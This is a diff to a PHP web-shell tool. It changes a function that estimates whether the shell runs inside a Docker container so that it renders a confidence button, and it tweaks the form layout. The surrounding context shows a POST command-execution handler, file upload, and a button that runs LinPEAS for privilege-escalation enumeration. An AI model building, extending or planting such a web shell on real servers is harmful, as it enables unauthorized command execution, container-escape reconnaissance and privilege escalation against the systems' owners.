@@ -254,14 +254,14 @@ function check_install(string $command, ?string $check = null, array $available_
     return strpos($output, $check) !== false ? 'YES' : 'NO';
 }
 
-function is_in_docker(): int
+function is_in_docker(): string
 {
     $score = 0;
-    $max_score = 4;
+    $max_score = 6;
 
     // Strong signal: presence of .dockerenv
     if (file_exists('/.dockerenv')) {
-        $score += 2;
+        $score += 3;
     }
 
     // Medium signal: docker or containerd in cgroup
@@ -269,7 +269,7 @@ function is_in_docker(): int
         is_readable('/proc/1/cgroup') &&
         preg_match('/docker|containerd/', file_get_contents('/proc/1/cgroup'))
     ) {
-        $score += 1;
+        $score += 2;
     }
 
     // Weak signal: hostname pattern
@@ -279,7 +279,20 @@ function is_in_docker(): int
     }
 
     // Convert to percent
-    return intval(($score / $max_score) * 100);
+    $percent = intval(($score / $max_score) * 100);
+    if ($percent < 25){
+        $color = "#d7191c";
+    }
+    else if ($percent < 50){
+        $color = "#fdae61";
+    }
+    else if ($percent < 75){
+        $color = "#a6d96a";
+    }
+    else {
+        $color = "#1a9641";
+    }
+    return "<button class='btn' disabled style='color: $color; margin: 0px; width: auto !important; font-weight: bold'>Shell&nbsp;In&nbsp;Docker&nbsp;Container&nbsp;Confidence:&nbsp;$percent%</button>";
 }
 
 function listDirectory($path)
@@ -863,7 +876,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         </div>
         <div class="card">
             <div class="flex-column">
-                <p>Selected Folder: <input disabled class="selectedPath" name="selectedPath" value="/"></p>
+                <div class="flex-row" style="width: 100% !important">
+                    <label>Selected&nbsp;Folder:</label>
+                    <input disabled class="selectedPath" name="selectedPath" value="/">
+                </div>
                 <div class="flex-row">
                     <label for="uploadFileInput">Upload&nbsp;File:</label>
                     <input id="uploadFileInput" name="uploadFile" type="file">
@@ -894,6 +910,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                     <input style="width: auto" type="checkbox" id="cmdInputColors" checked>
                     <label>Quick&nbsp;Commands:</label>
                     <button class="btn" onclick="executeShellCommand('./linpeas.sh > linpeas_out.txt 2>&1')">Run&nbsp;LinPEAS</button>
+                    <?php echo is_in_docker(); ?>
                 </div>
             </div>
             <div class="card" style="flex-grow: 1; display: flex; flex-direction: column; overflow: hidden">
